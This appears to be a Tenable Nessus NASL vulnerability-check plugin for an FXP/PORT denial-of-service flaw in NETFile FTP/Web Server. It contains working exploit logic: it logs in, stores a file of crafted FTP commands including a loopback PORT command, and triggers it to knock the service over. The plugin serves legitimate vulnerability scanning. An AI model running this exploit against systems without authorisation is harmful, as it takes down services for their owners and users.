#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote FTP server is prone to a denial of service attack. 

Description :

The NETFile FTP/Web server on the remote host is vulnerable to a
denial of service attack due to its support of the FXP protocol and
its failure to validate the IP address supplied in a PORT command. 

See also : 

http://www.security.org.sg/vuln/netfileftp746port.html

Solution : 

Upgrade to NETFile FTP/Web Server 7.6.0 or later and
disable FXP support.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";


if (description) {
  script_id(18295);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(13653);

  name["english"] = "NETFile FTP/Web Server FXP Denial of Service Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for FXP DoS vulnerability in NETFile FTP/Web Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/false_ftp");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# nb: we need to log in to exploit the vulnerability.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty.", level:0);
  exit(1);
}
writeable = get_kb_item("ftp/writeable_dir");
file = string(SCRIPT_NAME, "-", rand_str());


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  if (log_verbosity > 1) debug_print("couldn't login with supplied FTP credentials!", level:0);
  close(soc);
  exit(0);
}


# Try to store an exploit on the remote.
c = string("CWD ", writeable);
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);

pasv = open_sock_tcp(
  ftp_pasv(socket:soc), 
  transport:get_port_transport(port)
);
c = string("STOR ", file);
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
if (s =~ "^(150|425) ") {
  # Here's the exploit.
  c = string(
    "USER ", user, "\r\n",
    "PASS ", pass, "\r\n",
    "CWD ", writeable, "\r\n",
    "PORT 127,0,0,1,0,", port, "\r\n",
    "RETR ", file, "\r\n"
  );
  send(socket:pasv, data:c);
  close(pasv);

  # If we stored it ok, try to retrieve it.
  s = recv_line(socket:soc, length:1024);
  if (s =~ "^226 ") {
    c = string("PORT 127,0,0,1,0,21");
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);

    c = string("RETR ", file);
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);

    # There's a problem if we can no longer log in.
    soc2 = open_sock_tcp(port);
    if (soc2) {
      if (!ftp_authenticate(socket:soc2, user:user, pass:pass)) {
        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus has successfully exploited this vulnerability by adding a\n",
          "file - '", writeable, "/", file, "' - under NETFile's folder path\n",
          "on the remote host; you may wish to remove it at your convenience.\n"
        );
        security_hole(port:port, data:report);
      }
      close(soc2);
    }
  }
}
ftp_close(socket:soc);
